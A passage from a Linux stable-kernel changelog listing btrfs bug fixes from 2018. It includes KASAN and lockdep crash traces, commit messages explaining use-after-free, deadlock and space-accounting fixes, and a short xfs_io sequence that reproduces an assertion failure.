[ 9520.365923] ? \_raw\_spin\_unlock+0x27/0x40
[ 9520.366204] ? btrfs\_alloc\_data\_chunk\_ondemand+0x2c0/0x5c0 [btrfs]
[ 9520.366549] btrfs\_prealloc\_file\_range\_trans+0x23/0x30 [btrfs]
[ 9520.366880] cache\_save\_setup+0x42e/0x580 [btrfs]
[ 9520.367220] ? btrfs\_check\_data\_free\_space+0xd0/0xd0 [btrfs]
[ 9520.367518] ? lock\_downgrade+0x2f0/0x2f0
[ 9520.367799] ? btrfs\_write\_dirty\_block\_groups+0x11f/0x6e0 [btrfs]
[ 9520.368104] ? kasan\_check\_read+0x11/0x20
[ 9520.368349] ? do\_raw\_spin\_unlock+0xa8/0x140
[ 9520.368638] btrfs\_write\_dirty\_block\_groups+0x2af/0x6e0 [btrfs]
[ 9520.368978] ? btrfs\_start\_dirty\_block\_groups+0x870/0x870 [btrfs]
[ 9520.369282] ? do\_raw\_spin\_unlock+0xa8/0x140
[ 9520.369534] ? \_raw\_spin\_unlock+0x27/0x40
[ 9520.369811] ? btrfs\_run\_delayed\_refs+0x1b8/0x230 [btrfs]
[ 9520.370137] commit\_cowonly\_roots+0x4b9/0x610 [btrfs]
[ 9520.370560] ? commit\_fs\_roots+0x350/0x350 [btrfs]
[ 9520.370926] ? btrfs\_run\_delayed\_refs+0x1b8/0x230 [btrfs]
[ 9520.371285] btrfs\_commit\_transaction+0x5e5/0x10e0 [btrfs]
[ 9520.371612] ? btrfs\_apply\_pending\_changes+0x90/0x90 [btrfs]
[ 9520.371943] ? start\_transaction+0x168/0x6c0 [btrfs]
[ 9520.372257] transaction\_kthread+0x21c/0x240 [btrfs]
[ 9520.372537] kthread+0x1d2/0x1f0
[ 9520.372793] ? btrfs\_cleanup\_transaction+0xb50/0xb50 [btrfs]
[ 9520.373090] ? kthread\_park+0xb0/0xb0
[ 9520.373329] ret\_from\_fork+0x3a/0x50
[ 9520.373567]
[ 9520.373738] Allocated by task 1804:
[ 9520.373974] kasan\_kmalloc+0xff/0x180
[ 9520.374208] kasan\_slab\_alloc+0x11/0x20
[ 9520.374447] kmem\_cache\_alloc+0xfc/0x2d0
[ 9520.374731] \_\_btrfs\_add\_free\_space+0x40/0x580 [btrfs]
[ 9520.375044] unpin\_extent\_range+0x4f7/0x7a0 [btrfs]
[ 9520.375383] btrfs\_finish\_extent\_commit+0x15f/0x4d0 [btrfs]
[ 9520.375707] btrfs\_commit\_transaction+0xb06/0x10e0 [btrfs]
[ 9520.376027] btrfs\_alloc\_data\_chunk\_ondemand+0x237/0x5c0 [btrfs]
[ 9520.376365] btrfs\_check\_data\_free\_space+0x81/0xd0 [btrfs]
[ 9520.376689] btrfs\_delalloc\_reserve\_space+0x25/0x80 [btrfs]
[ 9520.377018] btrfs\_direct\_IO+0x42e/0x6d0 [btrfs]
[ 9520.377284] generic\_file\_direct\_write+0x11e/0x220
[ 9520.377587] btrfs\_file\_write\_iter+0x472/0xac0 [btrfs]
[ 9520.377875] aio\_write+0x25c/0x360
[ 9520.378106] io\_submit\_one+0xaa0/0xdc0
[ 9520.378343] \_\_se\_sys\_io\_submit+0xfa/0x2f0
[ 9520.378589] \_\_x64\_sys\_io\_submit+0x43/0x50
[ 9520.378840] do\_syscall\_64+0x7d/0x240
[ 9520.379081] entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
[ 9520.379387]
[ 9520.379557] Freed by task 1802:
[ 9520.379782] \_\_kasan\_slab\_free+0x173/0x260
[ 9520.380028] kasan\_slab\_free+0xe/0x10
[ 9520.380262] kmem\_cache\_free+0xc1/0x2c0
[ 9520.380544] btrfs\_find\_space\_for\_alloc+0x4cd/0x4e0 [btrfs]
[ 9520.380866] find\_free\_extent+0xa99/0x17e0 [btrfs]
[ 9520.381166] btrfs\_reserve\_extent+0xd5/0x1f0 [btrfs]
[ 9520.381474] btrfs\_get\_blocks\_direct+0x60b/0xbd0 [btrfs]
[ 9520.381761] \_\_blockdev\_direct\_IO+0x10ee/0x58a1
[ 9520.382059] btrfs\_direct\_IO+0x25a/0x6d0 [btrfs]
[ 9520.382321] generic\_file\_direct\_write+0x11e/0x220
[ 9520.382623] btrfs\_file\_write\_iter+0x472/0xac0 [btrfs]
[ 9520.382904] aio\_write+0x25c/0x360
[ 9520.383172] io\_submit\_one+0xaa0/0xdc0
[ 9520.383416] \_\_se\_sys\_io\_submit+0xfa/0x2f0
[ 9520.383678] \_\_x64\_sys\_io\_submit+0x43/0x50
[ 9520.383927] do\_syscall\_64+0x7d/0x240
[ 9520.384165] entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
[ 9520.384439]
[ 9520.384610] The buggy address belongs to the object at ffff8800b7ada500
which belongs to the cache btrfs\_free\_space of size 72
[ 9520.385175] The buggy address is located 0 bytes inside of
72-byte region [ffff8800b7ada500, ffff8800b7ada548)
[ 9520.385691] The buggy address belongs to the page:
[ 9520.385957] page:ffffea0002deb680 count:1 mapcount:0 mapping:ffff880108a1d700 index:0x0 compound\_mapcount: 0
[ 9520.388030] flags: 0x8100(slab|head)
[ 9520.388281] raw: 0000000000008100 ffffea0002deb608 ffffea0002728808 ffff880108a1d700
[ 9520.388722] raw: 0000000000000000 0000000000130013 00000001ffffffff 0000000000000000
[ 9520.389169] page dumped because: kasan: bad access detected
[ 9520.389473]
[ 9520.389658] Memory state around the buggy address:
[ 9520.389943] ffff8800b7ada400: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[ 9520.390368] ffff8800b7ada480: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[ 9520.390796] >ffff8800b7ada500: fb fb fb fb fb fb fb fb fb fc fc fc fc fc fc fc
[ 9520.391223] ^
[ 9520.391461] ffff8800b7ada580: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[ 9520.391885] ffff8800b7ada600: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[ 9520.392313] ==================================================================
[ 9520.392772] BTRFS critical (device vdc): entry offset 2258497536, bytes 131072, bitmap no
[ 9520.393247] BUG: unable to handle kernel NULL pointer dereference at 0000000000000011
[ 9520.393705] PGD 800000010dbab067 P4D 800000010dbab067 PUD 107551067 PMD 0
[ 9520.394059] Oops: 0000 [#1] SMP DEBUG\_PAGEALLOC KASAN PTI
[ 9520.394378] CPU: 4 PID: 1721 Comm: btrfs-transacti Tainted: G B L 4.19.0-rc8-nbor #555
[ 9520.394858] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[ 9520.395350] RIP: 0010:rb\_next+0x3c/0x90
[ 9520.396461] RSP: 0018:ffff8801074ff780 EFLAGS: 00010292
[ 9520.396762] RAX: 0000000000000000 RBX: 0000000000000001 RCX: ffffffff81b5ac4c
[ 9520.397115] RDX: 0000000000000000 RSI: 0000000000000008 RDI: 0000000000000011
[ 9520.397468] RBP: ffff8801074ff7a0 R08: ffffed0021d64ccc R09: ffffed0021d64ccc
[ 9520.397821] R10: 0000000000000001 R11: ffffed0021d64ccb R12: ffff8800b91e0000
[ 9520.398188] R13: ffff8800a3ceba48 R14: ffff8800b627bf80 R15: 0000000000020000
[ 9520.398555] FS: 0000000000000000(0000) GS:ffff88010eb00000(0000) knlGS:0000000000000000
[ 9520.399007] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 9520.399335] CR2: 0000000000000011 CR3: 0000000106b52000 CR4: 00000000000006a0
[ 9520.399679] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[ 9520.400023] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[ 9520.400400] Call Trace:
[ 9520.400648] btrfs\_dump\_free\_space+0x146/0x160 [btrfs]
[ 9520.400974] dump\_space\_info+0x2cd/0x310 [btrfs]
[ 9520.401287] btrfs\_reserve\_extent+0x1ee/0x1f0 [btrfs]
[ 9520.401609] \_\_btrfs\_prealloc\_file\_range+0x1cc/0x620 [btrfs]
[ 9520.401952] ? btrfs\_update\_time+0x180/0x180 [btrfs]
[ 9520.402232] ? \_raw\_spin\_unlock+0x27/0x40
[ 9520.402522] ? btrfs\_alloc\_data\_chunk\_ondemand+0x2c0/0x5c0 [btrfs]
[ 9520.402882] btrfs\_prealloc\_file\_range\_trans+0x23/0x30 [btrfs]
[ 9520.403261] cache\_save\_setup+0x42e/0x580 [btrfs]
[ 9520.403570] ? btrfs\_check\_data\_free\_space+0xd0/0xd0 [btrfs]
[ 9520.403871] ? lock\_downgrade+0x2f0/0x2f0
[ 9520.404161] ? btrfs\_write\_dirty\_block\_groups+0x11f/0x6e0 [btrfs]
[ 9520.404481] ? kasan\_check\_read+0x11/0x20
[ 9520.404732] ? do\_raw\_spin\_unlock+0xa8/0x140
[ 9520.405026] btrfs\_write\_dirty\_block\_groups+0x2af/0x6e0 [btrfs]
[ 9520.405375] ? btrfs\_start\_dirty\_block\_groups+0x870/0x870 [btrfs]
[ 9520.405694] ? do\_raw\_spin\_unlock+0xa8/0x140
[ 9520.405958] ? \_raw\_spin\_unlock+0x27/0x40
[ 9520.406243] ? btrfs\_run\_delayed\_refs+0x1b8/0x230 [btrfs]
[ 9520.406574] commit\_cowonly\_roots+0x4b9/0x610 [btrfs]
[ 9520.406899] ? commit\_fs\_roots+0x350/0x350 [btrfs]
[ 9520.407253] ? btrfs\_run\_delayed\_refs+0x1b8/0x230 [btrfs]
[ 9520.407589] btrfs\_commit\_transaction+0x5e5/0x10e0 [btrfs]
[ 9520.407925] ? btrfs\_apply\_pending\_changes+0x90/0x90 [btrfs]
[ 9520.408262] ? start\_transaction+0x168/0x6c0 [btrfs]
[ 9520.408582] transaction\_kthread+0x21c/0x240 [btrfs]
[ 9520.408870] kthread+0x1d2/0x1f0
[ 9520.409138] ? btrfs\_cleanup\_transaction+0xb50/0xb50 [btrfs]
[ 9520.409440] ? kthread\_park+0xb0/0xb0
[ 9520.409682] ret\_from\_fork+0x3a/0x50
[ 9520.410508] Dumping ftrace buffer:
[ 9520.410764] (ftrace buffer empty)
[ 9520.411007] CR2: 0000000000000011
[ 9520.411297] ---[ end trace 01a0863445cf360a ]---
[ 9520.411568] RIP: 0010:rb\_next+0x3c/0x90
[ 9520.412644] RSP: 0018:ffff8801074ff780 EFLAGS: 00010292
[ 9520.412932] RAX: 0000000000000000 RBX: 0000000000000001 RCX: ffffffff81b5ac4c
[ 9520.413274] RDX: 0000000000000000 RSI: 0000000000000008 RDI: 0000000000000011
[ 9520.413616] RBP: ffff8801074ff7a0 R08: ffffed0021d64ccc R09: ffffed0021d64ccc
[ 9520.414007] R10: 0000000000000001 R11: ffffed0021d64ccb R12: ffff8800b91e0000
[ 9520.414349] R13: ffff8800a3ceba48 R14: ffff8800b627bf80 R15: 0000000000020000
[ 9520.416074] FS: 0000000000000000(0000) GS:ffff88010eb00000(0000) knlGS:0000000000000000
[ 9520.416536] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 9520.416848] CR2: 0000000000000011 CR3: 0000000106b52000 CR4: 00000000000006a0
[ 9520.418477] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[ 9520.418846] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[ 9520.419204] Kernel panic - not syncing: Fatal exception
[ 9520.419666] Dumping ftrace buffer:
[ 9520.419930] (ftrace buffer empty)
[ 9520.420168] Kernel Offset: disabled
[ 9520.420406] ---[ end Kernel panic - not syncing: Fatal exception ]---
Fix this by acquiring the respective lock before iterating the rbtree.
Reported-by: Nikolay Borisov
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Josef Bacik
Signed-off-by: Filipe Manana
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit b7edab6df938ba3c73fbe9d19c1bb88846444645
Author: Filipe Manana
Date: Fri Oct 12 13:02:48 2018 +0100
Btrfs: fix use-after-free during inode eviction
commit 421f0922a2cfb0c75acd9746454aaa576c711a65 upstream.
At inode.c:evict\_inode\_truncate\_pages(), when we iterate over the
inode's extent states, we access an extent state record's "state" field
after we unlocked the inode's io tree lock. This can lead to a
use-after-free issue because after we unlock the io tree that extent
state record might have been freed due to being merged into another
adjacent extent state record (a previous inflight bio for a read
operation finished in the meanwhile which unlocked a range in the io
tree and cause a merge of extent state records, as explained in the
comment before the while loop added in commit 6ca0709756710 ("Btrfs: fix
hang during inode eviction due to concurrent readahead")).
Fix this by keeping a copy of the extent state's flags in a local
variable and using it after unlocking the io tree.
Bugzilla: https://bugzilla.kernel.org/show\_bug.cgi?id=201189
Fixes: b9d0b38928e2 ("btrfs: Add handler for invalidate page")
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Qu Wenruo
Signed-off-by: Filipe Manana
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 4fbcf14ceb4cba90de0998990731204ea42e5de2
Author: Josef Bacik
Date: Fri Oct 12 15:32:32 2018 -0400
btrfs: move the dio\_sem higher up the callchain
commit c495144bc6962186feae31d687596d2472000e45 upstream.
We're getting a lockdep splat because we take the dio\_sem under the
log\_mutex. What we really need is to protect fsync() from logging an
extent map for an extent we never waited on higher up, so just guard the
whole thing with dio\_sem.
======================================================
WARNING: possible circular locking dependency detected
4.18.0-rc4-xfstests-00025-g5de5edbaf1d4 #411 Not tainted
------------------------------------------------------
aio-dio-invalid/30928 is trying to acquire lock:
0000000092621cfd (&mm->mmap\_sem){++++}, at: get\_user\_pages\_unlocked+0x5a/0x1e0
but task is already holding lock:
00000000cefe6b35 (&ei->dio\_sem){++++}, at: btrfs\_direct\_IO+0x3be/0x400
which lock already depends on the new lock.
the existing dependency chain (in reverse order) is:
-> #5 (&ei->dio\_sem){++++}:
lock\_acquire+0xbd/0x220
down\_write+0x51/0xb0
btrfs\_log\_changed\_extents+0x80/0xa40
btrfs\_log\_inode+0xbaf/0x1000
btrfs\_log\_inode\_parent+0x26f/0xa80
btrfs\_log\_dentry\_safe+0x50/0x70
btrfs\_sync\_file+0x357/0x540
do\_fsync+0x38/0x60
\_\_ia32\_sys\_fdatasync+0x12/0x20
do\_fast\_syscall\_32+0x9a/0x2f0
entry\_SYSENTER\_compat+0x84/0x96
-> #4 (&ei->log\_mutex){+.+.}:
lock\_acquire+0xbd/0x220
\_\_mutex\_lock+0x86/0xa10
btrfs\_record\_unlink\_dir+0x2a/0xa0
btrfs\_unlink+0x5a/0xc0
vfs\_unlink+0xb1/0x1a0
do\_unlinkat+0x264/0x2b0
do\_fast\_syscall\_32+0x9a/0x2f0
entry\_SYSENTER\_compat+0x84/0x96
-> #3 (sb\_internal#2){.+.+}:
lock\_acquire+0xbd/0x220
\_\_sb\_start\_write+0x14d/0x230
start\_transaction+0x3e6/0x590
btrfs\_evict\_inode+0x475/0x640
evict+0xbf/0x1b0
btrfs\_run\_delayed\_iputs+0x6c/0x90
cleaner\_kthread+0x124/0x1a0
kthread+0x106/0x140
ret\_from\_fork+0x3a/0x50
-> #2 (&fs\_info->cleaner\_delayed\_iput\_mutex){+.+.}:
lock\_acquire+0xbd/0x220
\_\_mutex\_lock+0x86/0xa10
btrfs\_alloc\_data\_chunk\_ondemand+0x197/0x530
btrfs\_check\_data\_free\_space+0x4c/0x90
btrfs\_delalloc\_reserve\_space+0x20/0x60
btrfs\_page\_mkwrite+0x87/0x520
do\_page\_mkwrite+0x31/0xa0
\_\_handle\_mm\_fault+0x799/0xb00
handle\_mm\_fault+0x7c/0xe0
\_\_do\_page\_fault+0x1d3/0x4a0
async\_page\_fault+0x1e/0x30
-> #1 (sb\_pagefaults){.+.+}:
lock\_acquire+0xbd/0x220
\_\_sb\_start\_write+0x14d/0x230
btrfs\_page\_mkwrite+0x6a/0x520
do\_page\_mkwrite+0x31/0xa0
\_\_handle\_mm\_fault+0x799/0xb00
handle\_mm\_fault+0x7c/0xe0
\_\_do\_page\_fault+0x1d3/0x4a0
async\_page\_fault+0x1e/0x30
-> #0 (&mm->mmap\_sem){++++}:
\_\_lock\_acquire+0x42e/0x7a0
lock\_acquire+0xbd/0x220
down\_read+0x48/0xb0
get\_user\_pages\_unlocked+0x5a/0x1e0
get\_user\_pages\_fast+0xa4/0x150
iov\_iter\_get\_pages+0xc3/0x340
do\_direct\_IO+0xf93/0x1d70
\_\_blockdev\_direct\_IO+0x32d/0x1c20
btrfs\_direct\_IO+0x227/0x400
generic\_file\_direct\_write+0xcf/0x180
btrfs\_file\_write\_iter+0x308/0x58c
aio\_write+0xf8/0x1d0
io\_submit\_one+0x3a9/0x620
\_\_ia32\_compat\_sys\_io\_submit+0xb2/0x270
do\_int80\_syscall\_32+0x5b/0x1a0
entry\_INT80\_compat+0x88/0xa0
other info that might help us debug this:
Chain exists of:
&mm->mmap\_sem --> &ei->log\_mutex --> &ei->dio\_sem
Possible unsafe locking scenario:
CPU0 CPU1
---- ----
lock(&ei->dio\_sem);
lock(&ei->log\_mutex);
lock(&ei->dio\_sem);
lock(&mm->mmap\_sem);
\*\*\* DEADLOCK \*\*\*
1 lock held by aio-dio-invalid/30928:
#0: 00000000cefe6b35 (&ei->dio\_sem){++++}, at: btrfs\_direct\_IO+0x3be/0x400
stack backtrace:
CPU: 0 PID: 30928 Comm: aio-dio-invalid Not tainted 4.18.0-rc4-xfstests-00025-g5de5edbaf1d4 #411
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.11.0-2.el7 04/01/2014
Call Trace:
dump\_stack+0x7c/0xbb
print\_circular\_bug.isra.37+0x297/0x2a4
check\_prev\_add.constprop.45+0x781/0x7a0
? \_\_lock\_acquire+0x42e/0x7a0
validate\_chain.isra.41+0x7f0/0xb00
\_\_lock\_acquire+0x42e/0x7a0
lock\_acquire+0xbd/0x220
? get\_user\_pages\_unlocked+0x5a/0x1e0
down\_read+0x48/0xb0
? get\_user\_pages\_unlocked+0x5a/0x1e0
get\_user\_pages\_unlocked+0x5a/0x1e0
get\_user\_pages\_fast+0xa4/0x150
iov\_iter\_get\_pages+0xc3/0x340
do\_direct\_IO+0xf93/0x1d70
? \_\_alloc\_workqueue\_key+0x358/0x490
? \_\_blockdev\_direct\_IO+0x14b/0x1c20
\_\_blockdev\_direct\_IO+0x32d/0x1c20
? btrfs\_run\_delalloc\_work+0x40/0x40
? can\_nocow\_extent+0x490/0x490
? kvm\_clock\_read+0x1f/0x30
? can\_nocow\_extent+0x490/0x490
? btrfs\_run\_delalloc\_work+0x40/0x40
btrfs\_direct\_IO+0x227/0x400
? btrfs\_run\_delalloc\_work+0x40/0x40
generic\_file\_direct\_write+0xcf/0x180
btrfs\_file\_write\_iter+0x308/0x58c
aio\_write+0xf8/0x1d0
? kvm\_clock\_read+0x1f/0x30
? \_\_might\_fault+0x3e/0x90
io\_submit\_one+0x3a9/0x620
? io\_submit\_one+0xe5/0x620
\_\_ia32\_compat\_sys\_io\_submit+0xb2/0x270
do\_int80\_syscall\_32+0x5b/0x1a0
entry\_INT80\_compat+0x88/0xa0
CC: stable@vger.kernel.org # 4.14+
Reviewed-by: Filipe Manana
Signed-off-by: Josef Bacik
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 904c7dc9dec1c84d550d814fb7ee50200b48e9d9
Author: Josef Bacik
Date: Thu Oct 11 15:54:31 2018 -0400
btrfs: don't run delayed\_iputs in commit
commit 30928e9baac238a7330085a1c5747f0b5df444b4 upstream.
This could result in a really bad case where we do something like
evict
evict\_refill\_and\_join
btrfs\_commit\_transaction
btrfs\_run\_delayed\_iputs
evict
evict\_refill\_and\_join
btrfs\_commit\_transaction
... forever
We have plenty of other places where we run delayed iputs that are much
safer, let those do the work.
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Filipe Manana
Signed-off-by: Josef Bacik
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 13d6628c019d7d3ddd749d09ffb4152ae0ad8e8b
Author: Josef Bacik
Date: Thu Oct 11 15:54:22 2018 -0400
btrfs: fix insert\_reserved error handling
commit 80ee54bfe8a3850015585ebc84e8d207fcae6831 upstream.
We were not handling the reserved byte accounting properly for data
references. Metadata was fine, if it errored out the error paths would
free the bytes\_reserved count and pin the extent, but it even missed one
of the error cases. So instead move this handling up into
run\_one\_delayed\_ref so we are sure that both cases are properly cleaned
up in case of a transaction abort.
CC: stable@vger.kernel.org # 4.18+
Reviewed-by: Nikolay Borisov
Signed-off-by: Josef Bacik
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 68c7db7c8f76e80d2128da46249561208f51d988
Author: Josef Bacik
Date: Thu Oct 11 15:54:21 2018 -0400
btrfs: only free reserved extent if we didn't insert it
commit 49940bdd57779c78462da7aa5a8650b2fea8c2ff upstream.
When we insert the file extent once the ordered extent completes we free
the reserved extent reservation as it'll have been migrated to the
bytes\_used counter. However if we error out after this step we'll still
clear the reserved extent reservation, resulting in a negative
accounting of the reserved bytes for the block group and space info.
Fix this by only doing the free if we didn't successfully insert a file
extent for this extent.
CC: stable@vger.kernel.org # 4.14+
Reviewed-by: Omar Sandoval
Reviewed-by: Filipe Manana
Signed-off-by: Josef Bacik
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 3e9205b1d619280c1b7a1348e2e0180b1561a73c
Author: Josef Bacik
Date: Thu Oct 11 15:54:09 2018 -0400
btrfs: don't use ctl->free\_space for max\_extent\_size
commit fb5c39d7a887108087de6ff93d3f326b01b4ef41 upstream.
max\_extent\_size is supposed to be the largest contiguous range for the
space info, and ctl->free\_space is the total free space in the block
group. We need to keep track of these separately and \_only\_ use the
max\_free\_space if we don't have a max\_extent\_size, as that means our
original request was too large to search any of the block groups for and
therefore wouldn't have a max\_extent\_size set.
CC: stable@vger.kernel.org # 4.14+
Reviewed-by: Filipe Manana
Signed-off-by: Josef Bacik
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 171d45102ea88b69e686d95717f29e8fcffe2e1d
Author: Josef Bacik
Date: Fri Oct 12 15:32:33 2018 -0400
btrfs: set max\_extent\_size properly
commit ad22cf6ea47fa20fbe11ac324a0a15c0a9a4a2a9 upstream.
We can't use entry->bytes if our entry is a bitmap entry, we need to use
entry->max\_extent\_size in that case. Fix up all the logic to make this
consistent.
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Josef Bacik
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 17a7240a9508d8fbb189456960628170bb9b8833
Author: Josef Bacik
Date: Thu Oct 11 15:54:03 2018 -0400
btrfs: reset max\_extent\_size properly
commit 21a94f7acf0f748599ea552af5d9ee7d7e41c72f upstream.
If we use up our block group before allocating a new one we'll easily
get a max\_extent\_size that's set really really low, which will result in
a lot of fragmentation. We need to make sure we're resetting the
max\_extent\_size when we add a new chunk or add new space.
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Filipe Manana
Signed-off-by: Josef Bacik
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 645dd2f9feab405216397a40b0ed5ef17a6e8aa2
Author: Filipe Manana
Date: Fri Oct 12 10:03:55 2018 +0100
Btrfs: fix deadlock when writing out free space caches
commit 5ce555578e0919237fa4bda92b4670e2dd176f85 upstream.
When writing out a block group free space cache we can end deadlocking
with ourselves on an extent buffer lock resulting in a warning like the
following:
[245043.379979] WARNING: CPU: 4 PID: 2608 at fs/btrfs/locking.c:251 btrfs\_tree\_lock+0x1be/0x1d0 [btrfs]
[245043.392792] CPU: 4 PID: 2608 Comm: btrfs-transacti Tainted: G
W I 4.16.8 #1
[245043.395489] RIP: 0010:btrfs\_tree\_lock+0x1be/0x1d0 [btrfs]
[245043.396791] RSP: 0018:ffffc9000424b840 EFLAGS: 00010246
[245043.398093] RAX: 0000000000000a30 RBX: ffff8807e20a3d20 RCX: 0000000000000001
[245043.399414] RDX: 0000000000000001 RSI: 0000000000000002 RDI: ffff8807e20a3d20
[245043.400732] RBP: 0000000000000001 R08: ffff88041f39a700 R09: ffff880000000000
[245043.402021] R10: 0000000000000040 R11: ffff8807e20a3d20 R12: ffff8807cb220630
[245043.403296] R13: 0000000000000001 R14: ffff8807cb220628 R15: ffff88041fbdf000
[245043.404780] FS: 0000000000000000(0000) GS:ffff88082fc80000(0000) knlGS:0000000000000000
[245043.406050] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[245043.407321] CR2: 00007fffdbdb9f10 CR3: 0000000001c09005 CR4: 00000000000206e0
[245043.408670] Call Trace:
[245043.409977] btrfs\_search\_slot+0x761/0xa60 [btrfs]
[245043.411278] btrfs\_insert\_empty\_items+0x62/0xb0 [btrfs]
[245043.412572] btrfs\_insert\_item+0x5b/0xc0 [btrfs]
[245043.413922] btrfs\_create\_pending\_block\_groups+0xfb/0x1e0 [btrfs]
[245043.415216] do\_chunk\_alloc+0x1e5/0x2a0 [btrfs]
[245043.416487] find\_free\_extent+0xcd0/0xf60 [btrfs]
[245043.417813] btrfs\_reserve\_extent+0x96/0x1e0 [btrfs]
[245043.419105] btrfs\_alloc\_tree\_block+0xfb/0x4a0 [btrfs]
[245043.420378] \_\_btrfs\_cow\_block+0x127/0x550 [btrfs]
[245043.421652] btrfs\_cow\_block+0xee/0x190 [btrfs]
[245043.422979] btrfs\_search\_slot+0x227/0xa60 [btrfs]
[245043.424279] ? btrfs\_update\_inode\_item+0x59/0x100 [btrfs]
[245043.425538] ? iput+0x72/0x1e0
[245043.426798] write\_one\_cache\_group.isra.49+0x20/0x90 [btrfs]
[245043.428131] btrfs\_start\_dirty\_block\_groups+0x102/0x420 [btrfs]
[245043.429419] btrfs\_commit\_transaction+0x11b/0x880 [btrfs]
[245043.430712] ? start\_transaction+0x8e/0x410 [btrfs]
[245043.432006] transaction\_kthread+0x184/0x1a0 [btrfs]
[245043.433341] kthread+0xf0/0x130
[245043.434628] ? btrfs\_cleanup\_transaction+0x4e0/0x4e0 [btrfs]
[245043.435928] ? kthread\_create\_worker\_on\_cpu+0x40/0x40
[245043.437236] ret\_from\_fork+0x1f/0x30
[245043.441054] ---[ end trace 15abaa2aaf36827f ]---
This is because at write\_one\_cache\_group() when we are COWing a leaf from
the extent tree we end up allocating a new block group (chunk) and,
because we have hit a threshold on the number of bytes reserved for system
chunks, we attempt to finalize the creation of new block groups from the
current transaction, by calling btrfs\_create\_pending\_block\_groups().
However here we also need to modify the extent tree in order to insert
a block group item, and if the location for this new block group item
happens to be in the same leaf that we were COWing earlier, we deadlock
since btrfs\_search\_slot() tries to write lock the extent buffer that we
locked before at write\_one\_cache\_group().
We have already hit similar cases in the past and commit d9a0540a79f8
("Btrfs: fix deadlock when finalizing block group creation") fixed some
of those cases by delaying the creation of pending block groups at the
known specific spots that could lead to a deadlock. This change reworks
that commit to be more generic so that we don't have to add similar logic
to every possible path that can lead to a deadlock. This is done by
making \_\_btrfs\_cow\_block() disallowing the creation of new block groups
(setting the transaction's can\_flush\_pending\_bgs to false) before it
attempts to allocate a new extent buffer for either the extent, chunk or
device trees, since those are the trees that pending block creation
modifies. Once the new extent buffer is allocated, it allows creation of
pending block groups to happen again.
This change depends on a recent patch from Josef which is not yet in
Linus' tree, named "btrfs: make sure we create all new block groups" in
order to avoid occasional warnings at btrfs\_trans\_release\_chunk\_metadata().
Fixes: d9a0540a79f8 ("Btrfs: fix deadlock when finalizing block group creation")
CC: stable@vger.kernel.org # 4.4+
Bugzilla: https://bugzilla.kernel.org/show\_bug.cgi?id=199753
Link: https://lore.kernel.org/linux-btrfs/CAJtFHUTHna09ST-\_EEiyWmDH6gAqS6wa=zMNMBsifj8ABu99cw@mail.gmail.com/
Reported-by: E V
Reviewed-by: Josef Bacik
Signed-off-by: Filipe Manana
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit d7c7d298a76fbe3f5882dbc96b53afae6787768c
Author: Filipe Manana
Date: Mon Oct 15 09:51:00 2018 +0100
Btrfs: fix assertion on fsync of regular file when using no-holes feature
commit 7ed586d0a8241e81d58c656c5b315f781fa6fc97 upstream.
When using the NO\_HOLES feature and logging a regular file, we were
expecting that if we find an inline extent, that either its size in RAM
(uncompressed and unenconded) matches the size of the file or if it does
not, that it matches the sector size and it represents compressed data.
This assertion does not cover a case where the length of the inline extent
is smaller than the sector size and also smaller the file's size, such
case is possible through fallocate. Example:
$ mkfs.btrfs -f -O no-holes /dev/sdb
$ mount /dev/sdb /mnt
$ xfs\_io -f -c "pwrite -S 0xb60 0 21" /mnt/foobar
$ xfs\_io -c "falloc 40 40" /mnt/foobar
$ xfs\_io -c "fsync" /mnt/foobar
In the above example we trigger the assertion because the inline extent's
length is 21 bytes while the file size is 80 bytes. The fallocate() call
merely updated the file's size and did not touch the existing inline
extent, as expected.
So fix this by adjusting the assertion so that an inline extent length
smaller than the file size is valid if the file size is smaller than the
filesystem's sector size.
A test case for fstests follows soon.
Reported-by: Anatoly Trosinenko
Fixes: a89ca6f24ffe ("Btrfs: fix fsync after truncate when no\_holes feature is enabled")
CC: stable@vger.kernel.org # 4.14+
Link: https://lore.kernel.org/linux-btrfs/CAE5jQCfRSBC7n4pUTFJcmHh109=gwyT9mFkCOL+NKfzswmR=\_Q@mail.gmail.com/
Signed-off-by: Filipe Manana
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 191597b15b24f1a6d8fee3a76f51638f35fa7503
Author: Filipe Manana
Date: Sat Oct 13 00:37:25 2018 +0100
Btrfs: fix null pointer dereference on compressed write path error
commit 3527a018c00e5dbada2f9d7ed5576437b6dd5cfb upstream.
At inode.c:compress\_file\_range(), under the "free\_pages\_out" label, we can
